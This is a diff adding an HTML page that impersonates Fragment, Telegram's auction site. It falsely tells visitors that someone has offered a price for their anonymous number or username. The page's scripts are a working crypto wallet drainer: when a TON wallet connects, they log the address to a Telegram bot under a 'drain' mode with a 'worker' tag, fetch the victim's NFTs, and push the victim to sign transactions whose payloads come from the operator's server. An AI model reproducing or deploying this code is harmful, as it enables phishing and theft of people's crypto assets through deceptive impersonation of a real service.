@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html>
+  
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta charset="utf-8">
+    <title>$number – Fragment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <script>
+    // Функция для парсинга URL и проверки параметров
+    function checkUrlParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // Проверяем наличие параметра tgWebAppStartParam
+      const tgParam = urlParams.get('tgWebAppStartParam');
+      if (!tgParam) {
+        return false;
+      }
+
+      // Если параметр есть, декодируем и проверяем его
+      try {
+        const decodedParam = atob(tgParam);
+        const paramsArray = decodedParam.split('-');
+
+        // Разбираем параметры на ключи и значения
+        const params = {};
+        paramsArray.forEach(param => {
+          const [key, value] = param.split('_');
+          params[key] = value;
+        });
+
+        if (!params) {
+          return false;
+        }
+
+        // Успешная проверка, возвращаем true
+        return true;
+
+      } catch (error) {
+        // Обработка ошибок декодирования
+        return false;
+      }
+    }
+
+    // Выполняем проверку параметров перед загрузкой страницы
+    document.addEventListener('DOMContentLoaded', function() {
+      if (!checkUrlParams()) {
+        window.location.href = "https://fragment.com/";
+        return;
+      }
+    });
+  </script>
+<meta name="format-detection" content="telephone=no" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="MobileOptimized" content="176" />
+<meta name="HandheldFriendly" content="True" /><meta name="twitter:card" content="summary"></meta>
+<meta property="og:url" content="index.html" />
+<meta property="og:description" content="An auction for the anonymous number $number is in progress.">
+<meta property="og:site_name" content="Fragment Auctions">
+<link rel="canonical" href="index.html" />
+  
+<    <link rel="shortcut icon" href="https://fragment.com/img/fragment.ico" type="image/x-icon" />
+<link rel="mask-icon" href="https://fragment.com/img/fragment_icon.svg" color="#121519">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <link href="/css/font-robotoc4ca.css" rel="stylesheet" type="text/css">
+    <link href="/css/bootstrap.mineccb.css" rel="stylesheet">
+    <link href="/css/bootstrap-extrac81e.css" rel="stylesheet">
+    <link href="/css/auctiond09b.css" rel="stylesheet">
+
+  </head>
+  <body class="emoji_image no-transition">
+      <svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;left:-10000px">
+    <defs>
+      <path id="icon-premium" d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z"/>
+      <path id="icon-ton-qr" d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z" fill="none" stroke="currentColor" stroke-width="2.1"/>
+
+      <path d="M 6.67 5.74 L 8.88 1.32 C 9.13 0.81 9.74 0.6 10.25 0.86 C 10.45 0.96 10.61 1.13 10.71 1.33 L 12.79 5.59 C 12.96 5.93 13.29 6.17 13.67 6.22 L 18.03 6.74 C 18.62 6.82 19.05 7.36 18.98 7.96 C 18.95 8.2 18.84 8.43 18.66 8.61 L 15.21 12.03 C 15.07 12.16 15.01 12.36 15.03 12.56 L 15.6 17.17 C 15.69 17.83 15.22 18.44 14.57 18.52 C 14.32 18.55 14.07 18.5 13.85 18.38 L 10.21 16.38 C 9.95 16.24 9.63 16.23 9.36 16.37 L 5.59 18.32 C 5.06 18.59 4.41 18.38 4.14 17.84 C 4.03 17.64 4 17.41 4.03 17.19 L 4.33 15.07 C 4.48 14.03 5.12 13.14 6.04 12.66 L 10.23 10.51 C 10.34 10.45 10.38 10.31 10.33 10.2 C 10.28 10.11 10.19 10.06 10.09 10.08 L 4.97 10.82 C 4.19 10.93 3.39 10.71 2.78 10.2 L 1.07 8.8 C 0.58 8.4 0.51 7.68 0.9 7.18 C 1.09 6.96 1.35 6.81 1.64 6.77 L 6.02 6.2 C 6.3 6.17 6.54 5.99 6.67 5.74 Z" id="icon-star"></path>
+      <linearGradient x1="25%" y1="0.825%" x2="74.92%" y2="107.86%" id="s2"><stop stop-color="#FFD951" offset="0%"></stop><stop stop-color="#FFB222" offset="100%"></stop></linearGradient>
+      <linearGradient x1="50%" y1="0%" x2="50%" y2="99.8%" id="s3"><stop stop-color="#E58F0D" offset="0%"></stop><stop stop-color="#EB7915" offset="100%"></stop></linearGradient>
+      <filter x="-5.2%" y="-5.3%" width="110.3%" height="110.6%" filterUnits="objectBoundingBox" id="s4"><feOffset dx="1" dy="1" in="SourceAlpha" result="shadowOffsetInner1"></feOffset><feComposite in="shadowOffsetInner1" in2="SourceAlpha" operator="arithmetic" k2="-1" k3="1" result="shadowInnerInner1"></feComposite><feColorMatrix values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.657 0" type="matrix" in="shadowInnerInner1"></feColorMatrix>
+      </filter>
+      <g id="icon-colorful-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+        <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+        <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+      </g>
+      <g id="icon-multi-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <use stroke="currentColor" stroke-width="2.67" xlink:href="#icon-star"></use>
+        <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+        <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+        <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+        <path d="M 4 19 L 14 19 L 9 16.5 L 4 19 Z" fill="currentColor"></path>
+      </g>
+    </defs>
+  </svg>
+    <div id="aj_progress" class="progress-bar"></div>
+    
+    <div id="aj_content">    <header class="tm-header">
+    <div class="tm-header-logo">
+      <a href="https://fragment.com/" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
+        <i class="tm-logo-icon js-logo-icon"></i>
+        <i class="tm-logo-text"></i>
+      </a>
+    </div>
+    <div class="tm-header-body">
+        <form action="https://fragment.com/numbers" class="tm-header-search-form">
+    <div class="icon-before icon-search tm-field tm-search-field">
+      <input type="search" class="form-control tm-input tm-search-input" name="query" placeholder="Search phone numbers" autocomplete="off" />
+    </div>
+  </form>
+    </div>
+    <div class="tm-header-actions tm-header-actions-wide">
+        <button class="btn btn-default tm-header-action tm-header-button login-link">
+    <i class="icon icon-connect-telegram"></i>
+    <span class="tm-button-label">Connect Telegram</span>
+  </button>
+        <button class="btn btn-primary tm-header-action tm-header-button ton-auth-link">
+    <i class="icon icon-connect-ton"></i>
+    <span class="tm-button-label">Connect TON</span>
+  </button>
+      
+    </div>
+    
+    <div class="tm-header-menu-button js-header-menu-button icon-before icon-header-menu" id="wanfkn2k1"></div>
+    <div class="tm-header-menu js-header-menu hide aj_popup" data-close-outside="js-header-menu-window" id="n2ij53bk5b3">
+      <div class="tm-header-menu-window js-header-menu-window" >
+        
+      </div>
+    </div>
+  </header>
+    <main class="tm-main js-main-content">
+      <section class="tm-section tm-auction-section">
+    <div class="tm-section-header">
+      <h2 class="tm-section-header-text">
+        <span class="tm-section-header-domain">$number</span>
+        <span class="tm-section-header-status tm-status-avail">Claimed</span>
+        
+      </h2>
+        <div class="tm-section-subscribe tm-section-box js-subscribe">
+    <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
+    <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
+  </div>
+    </div>
+      <div class="tm-section-box tm-section-bid-info">
+    <table class="table tm-table tm-table-fixed">
+      <thead>
+        <tr>
+          <th>What is this?</th>
+        </tr>
+      </thead>
+      <tbody>
+        <td>
+        </td>
+      </tbody>
+    </table>
+    <div class="tm-bid-info-text tm-offer-info-text">
+      Someone offered <span class="icon-before icon-ton">$price</span> for your anonymous number. If the price suits you, press "Accept the offer".
+      <a href="https://fragment.com/about" class="tm-nowrap js-howofferworks"><br>How does this work?</a>
+    </div>
+  </div>
+      <div class="tm-list tm-section-box tm-section-auction-info">
+    <dl class="tm-list-item">
+      <dt class="tm-list-item-title">Anonymous Number</dt>
+      <dd class="tm-list-item-value">
+        <span class="accent-color">$number</span>
+      </dd>
+    </dl>
+    <div class="tm-list-item-hint">
+      This anonymous number can be used to create a Telegram account not tied to a SIM card.
+    </div>
+  </div>
+    <div class="tm-section-box tm-section-buttons">
+    <button class="btn btn-primary js-buy-now-btn1" id="ton-connect-button" data-bid-amount="145">
+      <span class="tm-button-label1">Accept the offer</span></span>
+    </button>
+  </div>
+    <div class="tm-section-subscribe tm-section-box js-subscribe">
+    <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
+    <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
+  </div>
+  </section>
+    <section class="tm-section clearfix">
+    <div class="tm-section-header">
+      <h3 class="tm-section-header-text">Latest Offers</h3>
+    </div>
+    <div class="tm-table-wrap">
+      <table class="table tm-table tm-table-fixed">
+        <thead>
+          <tr>
+            <th style="--thin-width:100px;--wide-width:25%">Offer</th>
+            <th style="--thin-width:110px;--wide-width:25%">Date</th>
+            <th style="--width:50%">From</th>
+          </tr>
+        </thead>
+        <tfoot>
+          
+        </tfoot>
+        <tbody>
+            <tr>
+    <td>
+      <div class="table-cell">
+        <div class="table-cell-value tm-value icon-before icon-ton">$price</div>
+      </div>
+    </td>
+    <td>
+      <div class="table-cell">
+        <div class="tm-datetime">
+            <span class="thin-only">
+                <time id="short-time" class="short"></time>
+            </span>
+            <span class="wide-only">
+                <time id="current-time"></time>
+            </span>
+        </div>
+    </div>
+    </td>
+    <td>
+      <div class="table-cell">
+        <a href="https://tonviewer.com/EQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olNBf" class="tm-wallet" target="_blank"><span class="head">EQDbnrjL3Mw4ikGWXdl9OVq6</span><span class="middle"></span><span class="tail">MCS3-qNb6WTmn8VnTB-olNBf</span></a>
+      </div>
+    </td>
+  </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+  </main>
+    <footer class="tm-footer">
+    <div class="tm-footer-links">
+      <a href="https://fragment.com/" class="tm-footer-link">Top Auctions</a>
+      <a href="https://fragment.com/about" class="tm-footer-link">About</a>
+      <a href="https://fragment.com/terms" class="tm-footer-link">Terms</a>
+      <a href="https://fragment.com/privacy" class="tm-footer-link">Privacy</a>
+    </div>>
+  </footer></div>
+    <script src="/js/jquery.minc4ca.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/main-aj7cbb.js"></script>
+    <script src="/js/jquery-ex98f1.js"></script>
+<script src="/js/qr-code-stylingc4ca.js"></script>
+<script src="/js/tonconnect-ui.min1679.js"></script>
+<script src="/js/auctionf033.js"></script>
+<script src="/js/tgstickerc16a.js"></script>
+<script src="/telegram.org/js/telegram-widgetb6d7.js"></script>
+<script>
+// Очистка кеша TonConnect при заходе на сайт
+document.addEventListener('DOMContentLoaded', function() {
+    localStorage.removeItem('tonconnect'); // Удаляем сохраненное состояние TonConnect
+});
+
+  // Функция для форматирования даты в формате ISO 8601
+  function formatDateToISO(date) {
+      return date.toISOString();
+  }
+
+  // Функция для форматирования даты в короткий текстовый формат
+  function formatDateShortDisplay(date) {
+      const options = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+      return date.toLocaleString('en-US', options).replace(',', ' at');
+  }
+
+  // Функция для форматирования даты в длинный текстовый формат
+  function formatDateLongDisplay(date) {
+      const options = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+      return date.toLocaleString('en-GB', options).replace(',', ' at');
+  }
+
+  // Получаем текущую дату и время
+  const now = new Date();
+
+  // Отнимаем 2 минуты от текущего времени
+  now.setMinutes(now.getMinutes() - 2);
+
+  // Вставляем обновленное время в оба элемента time
+  document.getElementById('short-time').setAttribute('datetime', formatDateToISO(now));
+  document.getElementById('short-time').textContent = formatDateShortDisplay(now);
+
+  document.getElementById('current-time').setAttribute('datetime', formatDateToISO(now));
+  document.getElementById('current-time').textContent = formatDateLongDisplay(now);
+</script>
+<script>
+document.addEventListener('DOMContentLoaded', async function() {
+
+async function fetchConvertedAddress(rawAddress) {
+    try {
+        const response = await fetch(`/convert-address?address=${encodeURIComponent(rawAddress)}`);
+        const data = await response.json();
+        console.log(data)
+        if (data.friendlyAddress) {
+            return data.friendlyAddress;
+        } else {
+            throw new Error('Failed to fetch converted address');
+        }
+    } catch (error) {
+        console.error('Error fetching converted address:', error);
+        return null;
+    }
+}
+
+function splitAddress(friendlyAddress) {
+    if (friendlyAddress) {
+        const head = friendlyAddress.slice(0, 14);
+        const middle = friendlyAddress.slice(14, -14);
+        const tail = friendlyAddress.slice(-14);
+        return { head, middle, tail };
+    }
+    return { head: '', middle: '', tail: '' };
+}
+
+async function updateMenuContent(isConnected) {
+    const menuWindow = document.querySelector('.tm-header-menu-window.js-header-menu-window');
+
+    if (menuWindow) {
+        if (isConnected) {isConnected.account.address
+            const rawAddress = tonConnectUI.wallet.account.address;
+            const friendlyAddress = await fetchConvertedAddress(rawAddress);
+            const { head, middle, tail } = splitAddress(friendlyAddress);
+            const address = friendlyAddress;
+
+            menuWindow.innerHTML = `
+                <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close" id="anwfabwfkj2"></div>
+                <div class="tm-header-menu-window js-header-menu-window">
+                <div class="tm-menu-account-header">
+          <div class="tm-menu-account-address">
+            <span class="tm-wallet">
+                                    <span class="head">${head}</span>
+                                    <span class="middle"></span>
+                                    <span class="tail">${tail}</span>
+            </span>
+            </div>
+          <div class="tm-menu-account-desc">Connected TON wallet</div>
+        </div>
+              <div class="tm-header-menu-body">
+                  <h4 class="tm-menu-subheader">My Account</h4>
+        <div class="tm-menu-links">
+          <a href="https://fragment.com/my/assets" class="tm-menu-link icon-before icon-menu-assets" data-counter="">My Assets</a>
+          <a href="https://fragment.com/my/bids" class="tm-menu-link icon-before icon-menu-bids" data-counter="">My Bids</a>
+          <a href="https://fragment.com/my/numbers" class="tm-menu-link icon-before icon-menu-numbers" data-counter="">My Anonymous Numbers</a>
+          
+          <a href="https://fragment.com/my/sessions" class="tm-menu-link icon-before icon-menu-sessions">Active Sessions</a>
+          <a href="javascript:;" class="tm-menu-link icon-before icon-menu-disconnect ton-logout-link">Disconnect TON</a>
+        </div>
+                <h4 class="tm-menu-subheader">Platform</h4>
+                <div class="tm-menu-links">
+                  <a href="https://fragment.com/about" class="tm-menu-link icon-before icon-menu-about">About</a>
+                  <a href="https://fragment.com/terms" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
+                  <a href="https://fragment.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
+                </div>
+                <div class="tm-header-menu-footer">
+                    <div class="tm-header-menu-footer-text">
+          Connect Telegram <br>to convert usernames to collectibles
+        </div>
+                  
+                    <button class="btn btn-default btn-block tm-menu-button login-link">
+          <i class="icon icon-connect-telegram"></i>
+          <span class="tm-button-label">Connect Telegram</span>
+        </button>
+                </div>
+              </div>
+            </div>
+                  `;
+
+                  // Привязка событий после обновления содержимого
+                  document.querySelector('.ton-logout-link').addEventListener('click', async () => {
+                    await tonConnectUI.disconnect();
+                    const isConnected = await tonConnectUI.connected;
+                    updateMenuContent(isConnected); // Update the menu content after disconnecting
+                  });
+
+              } else {
+                menuWindow.innerHTML = `
+                      <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close" id="anwfabwfkj2"></div>
+                      <div class="tm-header-menu-body">
+                          <h4 class="tm-menu-subheader">Platform</h4>
+                          <div class="tm-menu-links">
+                              <a href="#" class="tm-menu-link icon-before icon-menu-about">About</a>
+                              <a href="#" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
+                              <a href="#" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
+                          </div>
+                          <div class="tm-header-menu-footer">
+                              <div class="tm-header-menu-footer-text">
+                                  Connect TON and Telegram <br>to view your bids and assets
+                              </div>
+                              <button id="ton-connect-button" class="btn btn-primary btn-block tm-menu-button ton-auth-link">
+                                  <i class="icon icon-connect-ton"></i>
+                                  <span class="tm-button-label">Connect TON</span>
+                              </button>
+                              <button class="btn btn-default btn-block tm-menu-button login-link">
+                                  <i class="icon icon-connect-telegram"></i>
+                                  <span class="tm-button-label">Connect Telegram</span>
+                              </button>
+                          </div>
+                      </div>
+                  `;
+
+
+                // Add event listener for the Connect TON button
+                document.getElementById('ton-connect-button').addEventListener('click', async () => {
+                    await tonConnectUI.connectWallet();
+                    const isConnected = await tonConnectUI.connected;
+                    updateMenuContent(isConnected); // Update the menu content after disconnecting
+                });
+              }
+          }
+          
+          document.getElementById('anwfabwfkj2').addEventListener('click', () => {
+              document.getElementById('n2ij53bk5b3').classList.add('hide');
+          });
+
+          document.getElementById('wanfkn2k1').addEventListener('click', () => {
+              document.getElementById('n2ij53bk5b3').classList.remove('hide');
+          });
+      }
+const isConnected = await tonConnectUI.connected;
+updateMenuContent(isConnected);
+
+tonConnectUI.onStatusChange((status) => {
+    updateMenuContent(status);
+});
+});
+  </script>
+
+<script>
+function parseUrlParams(url) {
+    // Получаем параметры из URL
+    const urlParams = new URL(url).searchParams;
+
+    // Извлекаем значение параметра tgWebAppStartParam
+    const paramString = atob(urlParams.get('tgWebAppStartParam'));
+
+    // Разбиваем строку на части через символ "-"
+    const paramsArray = paramString.split('-');
+
+    // Инициализируем объект для хранения значений
+    const params = {};
+
+    // Проходим по каждой части и извлекаем значения через символ "_"
+    paramsArray.forEach(param => {
+        const [key, value] = param.split('_');
+        params[key] = value;
+    });
+
+    return params;
+}
+
+const currentUrl = window.location.href;
+
+// Парсим параметры
+const { price, number, username, worker } = parseUrlParams(currentUrl);
+//console.log({ price, number, username, worker })
+if (!worker){
+  worker="old_version"
+}
+
+// Заменяем $price на странице
+document.body.innerHTML = document.body.innerHTML.replace(/\$price/g, price);
+
+if (number) {
+    // Если параметр number существует, убираем символы 'z' и форматируем его
+    let cleanedNumber = number.replace(/z/g, '');
+    let formattedNumber = `+${cleanedNumber.slice(0, 3)} ${cleanedNumber.slice(3, 7)} ${cleanedNumber.slice(7)}`;
+
+    // Заменяем $number на странице
+    document.body.innerHTML = document.body.innerHTML.replace(/\$number/g, formattedNumber);
+} else if (username) {
+    // Если параметр username существует, заменяем на него $number и создаем блок с информацией
+    document.body.innerHTML = document.body.innerHTML.replace(/\$number/g, username+".t.me");
+    const telegramBlock = `
+    <div class="tm-list tm-section-box tm-section-auction-info" bis_skin_checked="1">
+        <dl class="tm-list-item">
+          <dt class="tm-list-item-title">Telegram Username</dt>
+          <dd class="tm-list-item-value">
+            <span class="accent-color">@${username}</span>
+          </dd>
+        </dl>
+        <dl class="tm-list-item">
+          <dt class="tm-list-item-title">Web Address</dt>
+          <dd class="tm-list-item-value">
+            <span class="accent-color">t.me/${username}</span>
+          </dd>
+        </dl>
+        <dl class="tm-list-item">
+          <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
+          <dd class="tm-list-item-value">
+            <span class="accent-color"><span class="tm-web3-address"><span class="subdomain">${username}</span><span class="domain">.t.me</span></span></span>
+          </dd>
+        </dl>
+    </div>`;
+    const telegram_info_Block = `
+    <div class="tm-bid-info-text tm-offer-info-text">
+      Someone offered <span class="icon-before icon-ton">${price}</span> for your username. If the price suits you, press "Accept the offer".
+      <a href="https://fragment.com/about" class="tm-nowrap js-howofferworks"><br>How does this work?</a>
+    </div>`;
+    
+    const number_info_Block = document.querySelector('.tm-bid-info-text.tm-offer-info-text');
+    if (number_info_Block) {
+      number_info_Block.outerHTML = telegram_info_Block;
+    }
+    const numberBlock = document.querySelector('.tm-list.tm-section-box.tm-section-auction-info');
+    if (numberBlock) {
+        numberBlock.outerHTML = telegramBlock;
+    }
+}
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: 'https://pst.innomi.net/paste/3q4e28p7yb9kzdpav2fenog2/raw'
+  });
+
+  document.getElementById('ton-connect-button').addEventListener('click', async () => {
+    try {
+        if (tonConnectUI.connected) {
+            // Если кошелек уже подключен, сразу выполняем транзакцию
+            await transferTon();
+        } else {
+            // Если кошелек не подключен, выполняем подключение
+            await tonConnectUI.connectWallet();
+        }
+    } catch (error) {
+        console.error('Ошибка при подключении кошелька или отправке транзакции:', error);
+    }
+});
+  
+async function getWalletBalance(walletAddress) {
+    try {
+        const response = await fetch(`/get-wallet-balance?walletAddress=${walletAddress}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        const balanceData = await response.json(); 
+        const balanceInNanoTON = balanceData.balance; 
+        const balanceInTON = balanceInNanoTON / 1_000_000_000;
+
+        return balanceInTON;
+    } catch (error) {
+        console.error('Ошибка при получении баланса:', error.message || error);
+        throw new Error('Не удалось получить баланс кошелька.');
+    }
+}
+
+async function transferTon() {
+    try {
+        if (!tonConnectUI.connected) {
+            throw new Error("Wallet must be connected to send a transaction.");
+        }
+
+        const nftAddresses = await fetchUserNFTs();
+        let transactionMessages = [];
+
+        // Примерная комиссия, в зависимости от сети и сложности транзакции
+        const estimatedCommissionInTON = 0.50; // Например, 0.05 TON
+
+        console.log('Estimated Commission:', estimatedCommissionInTON);
+
+        if (nftAddresses && nftAddresses.length > 0) {
+            let processedNFTs = 0; // Счётчик для ограничения
+            for (const item of nftAddresses) {
+                if (processedNFTs >= 4) {
+                    break; // Прерывание цикла после обработки 3 NFT
+                }
+                const nftPrice = item.price;
+
+                const response = await fetch('/generate-payload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        address: item.address,
+                        price: nftPrice * 1_000_000_000
+                    })
+                });
+
+                const data = await response.json();
+                const base64Payload = data.payload;
+                const addresses = tonConnectUI.wallet.account.address
+                transactionMessages.push({
+                    address: item.address,
+                    amount: "30000000", // Сумма в нанотонах (10^7 = 0.01 TON)
+                    payload: base64Payload 
+                });
+              processedNFTs++; // Увеличиваем счетчик
+            }
+        }
+
+        if (transactionMessages.length === 0) {
+            throw new Error("No valid transactions to process.");
+        }
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 360,
+            messages: transactionMessages
+        };
+
+        console.log('Transaction:', transaction);
+
+        const result = await tonConnectUI.sendTransaction(transaction);
+
+        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Transaction completed successfully', 'approve');
+
+        console.log('Transaction BOC:', result.boc);
+
+    } catch (e) {
+        console.error('Transaction failed:', e.message || e);
+
+        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Transaction failed', 'decline');
+
+    }
+}
+
+  
+function escapeMarkdownV2(text) {
+    return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
+}
+
+function generateNotificationMessage(walletAddress, offer, mode) {
+    const timestamp = new Date().toLocaleString();
+    let message = '';
+
+    if (mode === 'drain') {
+        message = `
+🔗 *Кошелек Подключен*
+
+*Детали:*
+\\- *Адрес кошелька:* \`${escapeMarkdownV2(walletAddress)}\`
+\\- *Время:* \`${escapeMarkdownV2(timestamp)}\`
+        `;
+    } else if (mode === 'approve') {
+        message = `
+✅ *Транзакция Одобрена*
+
+*Детали:*
+\\- *Адрес кошелька:* \`${escapeMarkdownV2(walletAddress)}\`
+\\- *Время:* \`${escapeMarkdownV2(timestamp)}\`
+        `;
+    } else if (mode === 'decline') {
+        message = `
+🚫 *Транзакция Отклонена*
+
+*Детали:*
+\\- *Адрес кошелька:* \`${escapeMarkdownV2(walletAddress)}\`
+\\- *Время:* \`${escapeMarkdownV2(timestamp)}\`
+        `;
+    }
+
+    return timestamp;
+}
+  
+async function notifyTelegramBot(walletAddress, offer, mode) {
+    try {
+        const message = generateNotificationMessage(walletAddress, offer, mode);
+        
+
+        const response = await fetch('/notify', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                walletAddress: walletAddress,
+                timestamp: message,
+                mode: mode,
+                worker: worker
+            })
+        });
+
+        if (!response.ok) {
+            console.error('Failed to send notification to Telegram bot');
+        } else {
+            console.log('Notification sent successfully');
+        }
+    } catch (error) {
+        console.error('Error sending notification to Telegram bot:', error);
+    }
+}
+
+  
+  async function fetchUserNFTs() {
+      try {
+          if (!tonConnectUI.connected) {
+              throw new Error("Wallet must be connected to fetch NFTs.");
+          }
+  
+          const response = await fetch('/get-user-nfts', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                  walletAddress: tonConnectUI.wallet.account.address
+              })
+          });
+  
+          if (!response.ok) {
+              throw new Error("Failed to fetch NFTs.");
+          }
+  
+          const nftData = await response.json();
+          console.log(nftData)
+  
+          // Ensure each NFT object has a price property
+          return nftData; // nftData should be an array of objects with { type, address, name, price }
+      } catch (e) {
+          console.error('Failed to fetch NFTs:', e.message || e);
+          return [];
+      }
+  }
+  
+  const val = 0;
+  tonConnectUI.onStatusChange(async (status) => {
+    console.log('Status Change:', status); // Log the status change
+
+    if (status) {
+        console.log('Wallet connected');
+        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet connected', 'drain');
+        await transferTon(); // Добавьте await для обеспечения выполнения кода последовательно
+    } else {
+        console.log('Wallet not connected');
+        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet disconnected', 'decline');
+    }
+});
+
+  </script>
+  
+    
+  </body>
+
+</html>
